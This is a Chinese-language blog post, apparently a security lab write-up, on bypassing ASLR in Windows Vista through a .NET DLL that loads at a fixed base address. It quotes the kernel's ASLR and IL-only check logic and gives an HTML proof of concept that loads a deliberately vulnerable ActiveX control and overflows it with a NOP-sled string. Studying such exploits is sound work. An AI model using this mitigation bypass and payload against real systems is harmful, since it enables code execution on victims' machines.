---
layout:		post
title:		为.NET控件禁用ASLR
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows Vista Ultimate sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>注意: 关闭系统DEP  
<!-- more -->


PE文件是否启用ASLR校验过程

```
......
if( !(pBinaryInfo->pHeaderInfo->usDllCharacteristics & IMAGE_DLL_ CHARACTERISTICS_ DYNAMIC_BASE) &&
		!(pBinaryInfo->pHeaderInfo->bFlags &PINFO_IL_ONLY_IMAGE) && !(_MmMoveImages == -1) )
{
	MiNoRelocate++;
	return 0;
}
......
```

.NET文件是否IL-Only校验过程, 版本号<2.5认定为IL-Only

```
......
if( ( (pCORHeader->MajorRuntimeVersion > 2) || (pCORHeader->MajorRuntime- Version == 2 && 
	pCORHeader->MinorRuntimeVersion >= 5) ) && (pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY) )
{
	pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags |= PINFO_IL_ONLY_
	IMAGE;
	......
}
......
```

修改DEP_NETDLL.dll

![](/assets/img/exploit/2017-12-30-break-aslr-dot-net/0x00.png)
![](/assets/img/exploit/2017-12-30-break-aslr-dot-net/0x01.png)

新建test.html, 这里依旧要用到VulnerAX.ocx

```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

OD附加上去, DEP_NETDLL.dll的加载基址没有随机化

![](/assets/img/exploit/2017-12-30-break-aslr-dot-net/0x02.png)

直接运行, pwn~

![](/assets/img/exploit/2017-12-30-break-aslr-dot-net/0x03.png)